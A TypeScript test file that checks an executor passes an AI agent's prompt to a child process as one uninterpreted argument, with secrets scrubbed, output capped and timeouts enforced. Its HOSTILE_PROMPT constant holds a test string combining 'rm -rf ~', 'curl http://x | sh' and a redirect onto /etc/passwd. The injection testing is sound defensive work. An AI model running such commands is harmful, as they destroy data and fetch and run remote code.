// Executor safety proof: the prompt — hostile shell metacharacters and all —
// reaches the child process as EXACTLY ONE argv element, with no shell
// interpretation (spawn shell:false). The stub executor is `node -e` printing
// its own process.argv back as JSON, so the test observes precisely what the
// OS handed the child.
import { existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  buildExecutorArgv,
  assertExecutorPromptFits,
  DEFAULT_MAX_EXECUTOR_PROMPT_BYTES,
  ExecutorError,
  preflightExecutor,
  runExecutor,
} from "../src/executor.js";

/** `node -e` stub that echoes its argv (past the -e script) back as JSON. */
const ECHO_ARGV: string[] = [
  process.execPath,
  "-e",
  "console.log(JSON.stringify(process.argv.slice(1)))",
  "{prompt}",
];

// Keep executable source static: filesystem paths are data arguments, never
// interpolated into JavaScript passed to `node -e`.
const DESCENDANT_SCRIPT =
  'setTimeout(()=>require("node:fs").writeFileSync(process.argv[1],"escaped"),350)';
const DESCENDANT_PARENT_SCRIPT =
  'const {spawn}=require("node:child_process");' +
  'const c=spawn(process.execPath,["-e",process.argv[1],process.argv[2]],{stdio:"ignore"});' +
  "c.unref();";

const HOSTILE_PROMPT =
  "Fix the bug; rm -rf ~ $(evil) `backdoor` && curl http://x | sh > /etc/passwd '\"";

describe("buildExecutorArgv", () => {
  it("replaces only elements that ARE the placeholder, as one element", () => {
    expect(buildExecutorArgv(["claude", "-p", "{prompt}"], "hi there")).toEqual([
      "claude",
      "-p",
      "hi there",
    ]);
  });

  it("caps UTF-8 prompt bytes before spawn/claim", () => {
    expect(() => assertExecutorPromptFits("a".repeat(1024), 1024)).not.toThrow();
    expect(() => assertExecutorPromptFits("é".repeat(513), 1024)).toThrow(
      /1026 bytes.*1024-byte argv cap/,
    );
    try {
      assertExecutorPromptFits("x".repeat(DEFAULT_MAX_EXECUTOR_PROMPT_BYTES + 1));
      throw new Error("expected oversized prompt to fail");
    } catch (error) {
      expect(error).toMatchObject({ detail: { reason: "prompt-overflow" } });
    }
    expect(() => assertExecutorPromptFits("valid-prefix\0hidden-suffix")).toThrow(
      /NUL byte/,
    );
  });

  it("appends the prompt when no placeholder is present", () => {
    expect(buildExecutorArgv(["claude", "-p"], "hi")).toEqual(["claude", "-p", "hi"]);
  });

  it("never splices the prompt into the middle of another element", () => {
    // "--flag={prompt}" is NOT the bare placeholder — it stays verbatim and
    // the prompt is appended instead (no partial-string interpolation).
    expect(buildExecutorArgv(["run", "--flag={prompt}"], "data")).toEqual([
      "run",
      "--flag={prompt}",
      "data",
    ]);
  });
});

describe("runExecutor", () => {
  it("preflights the executable before a task can be claimed", () => {
    expect(() =>
      preflightExecutor({
        argv: ["/definitely/not/a/real-binary", "{prompt}"],
        safeClaudeMode: false,
      }),
    ).toThrow(/not installed or executable/);
    expect(() =>
      preflightExecutor({ argv: [process.execPath, "{prompt}"], safeClaudeMode: false }),
    ).not.toThrow();
  });

  it("passes shell metacharacters through as ONE uninterpreted argv element", async () => {
    const { stdout } = await runExecutor({
      argv: ECHO_ARGV,
      prompt: HOSTILE_PROMPT,
      timeoutMs: 30_000,
    });
    const argv = JSON.parse(stdout.toString("utf8")) as string[];
    // Exactly one argument, byte-for-byte the hostile prompt: `;`, `$( )`,
    // backticks, pipes, redirects, and quotes were data, not shell syntax.
    expect(argv).toEqual([HOSTILE_PROMPT]);
  });

  it("uses a disposable cwd/HOME and scrubs ambient worker secrets", async () => {
    const oldWallet = process.env.AGENC_WORKER_WALLET;
    const oldRpc = process.env.AGENC_WORKER_RPC_URL;
    const oldKey = process.env.TEST_EXECUTOR_API_KEY;
    process.env.AGENC_WORKER_WALLET = "/secret/wallet.json";
    process.env.AGENC_WORKER_RPC_URL = "https://rpc-with-secret.example/key";
    process.env.TEST_EXECUTOR_API_KEY = "explicit-key";
    try {
      const script =
        "console.log(JSON.stringify({cwd:process.cwd(),home:process.env.HOME," +
        "wallet:process.env.AGENC_WORKER_WALLET,rpc:process.env.AGENC_WORKER_RPC_URL," +
        "key:process.env.TEST_EXECUTOR_API_KEY,safe:process.env.CLAUDE_CODE_SAFE_MODE}))";
      const { stdout } = await runExecutor({
        argv: [process.execPath, "-e", script, "{prompt}"],
        prompt: "x",
        timeoutMs: 30_000,
        envAllowlist: ["TEST_EXECUTOR_API_KEY"],
      });
      const observed = JSON.parse(stdout.toString("utf8")) as Record<string, string>;
      expect(observed.cwd).toContain("agenc-worker-executor-");
      expect(observed.home).toBe(observed.cwd);
      expect(observed.wallet).toBeUndefined();
      expect(observed.rpc).toBeUndefined();
      expect(observed.key).toBe("explicit-key");
      expect(observed.safe).toBe("1");
      expect(existsSync(observed.cwd!)).toBe(false);
    } finally {
      if (oldWallet === undefined) delete process.env.AGENC_WORKER_WALLET;
      else process.env.AGENC_WORKER_WALLET = oldWallet;
      if (oldRpc === undefined) delete process.env.AGENC_WORKER_RPC_URL;
      else process.env.AGENC_WORKER_RPC_URL = oldRpc;
      if (oldKey === undefined) delete process.env.TEST_EXECUTOR_API_KEY;
      else process.env.TEST_EXECUTOR_API_KEY = oldKey;
    }
  });

  it("inherits ambient process context only through the explicit unsafe option", async () => {
    const oldValue = process.env.TEST_UNSAFE_INHERIT;
    process.env.TEST_UNSAFE_INHERIT = "visible";
    try {
      const { stdout } = await runExecutor({
        argv: [
          process.execPath,
          "-e",
          "console.log(process.env.TEST_UNSAFE_INHERIT)",
          "{prompt}",
        ],
        prompt: "x",
        timeoutMs: 30_000,
        unsafeInheritProcessContext: true,
      });
      expect(stdout.toString("utf8").trim()).toBe("visible");
    } finally {
      if (oldValue === undefined) delete process.env.TEST_UNSAFE_INHERIT;
      else process.env.TEST_UNSAFE_INHERIT = oldValue;
    }
  });

  it("fails (does not resolve) on a non-zero exit code", async () => {
    await expect(
      runExecutor({
        argv: [process.execPath, "-e", "process.exit(3)", "{prompt}"],
        prompt: "x",
        timeoutMs: 30_000,
      }),
    ).rejects.toMatchObject({
      name: "ExecutorError",
      detail: { exitCode: 3, reason: "exit" },
    });
  });

  it("fails on spawn errors (missing binary)", async () => {
    await expect(
      runExecutor({
        argv: ["/definitely/not/a/real/binary-xyz", "{prompt}"],
        prompt: "x",
        timeoutMs: 30_000,
      }),
    ).rejects.toBeInstanceOf(ExecutorError);
  });

  it("kills and fails when stdout exceeds the byte cap", async () => {
    await expect(
      runExecutor({
        argv: [
          process.execPath,
          "-e",
          "const b=Buffer.alloc(65536,120);for(let i=0;i<32;i++)process.stdout.write(b);",
          "{prompt}",
        ],
        prompt: "x",
        timeoutMs: 30_000,
        maxStdoutBytes: 64 * 1024,
      }),
    ).rejects.toMatchObject({ detail: { reason: "stdout-overflow" } });
  });

  it("drains stderr without inheriting it and kills on bounded overflow", async () => {
    await expect(
      runExecutor({
        argv: [
          process.execPath,
          "-e",
          "const b=Buffer.alloc(65536,120);for(let i=0;i<8;i++)process.stderr.write(b);",
          "{prompt}",
        ],
        prompt: "x",
        timeoutMs: 30_000,
        maxStderrBytes: 64 * 1024,
      }),
    ).rejects.toMatchObject({ detail: { reason: "stderr-overflow" } });
  });

  it("kills same-group background descendants after a normal parent exit", async () => {
    if (process.platform === "win32") return;
    const marker = path.join(
      tmpdir(),
      `agenc-worker-descendant-${process.pid}-${Date.now()}`,
    );
    rmSync(marker, { force: true });
    await runExecutor({
      argv: [
        process.execPath,
        "-e",
        DESCENDANT_PARENT_SCRIPT,
        DESCENDANT_SCRIPT,
        marker,
        "{prompt}",
      ],
      prompt: "x",
      timeoutMs: 30_000,
    });
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(existsSync(marker)).toBe(false);
    rmSync(marker, { force: true });
  });

  it("kills and fails on timeout", async () => {
    await expect(
      runExecutor({
        argv: [process.execPath, "-e", "setTimeout(()=>{}, 60000)", "{prompt}"],
        prompt: "x",
        timeoutMs: 250,
      }),
    ).rejects.toMatchObject({ detail: { reason: "timeout" } });
  });
});
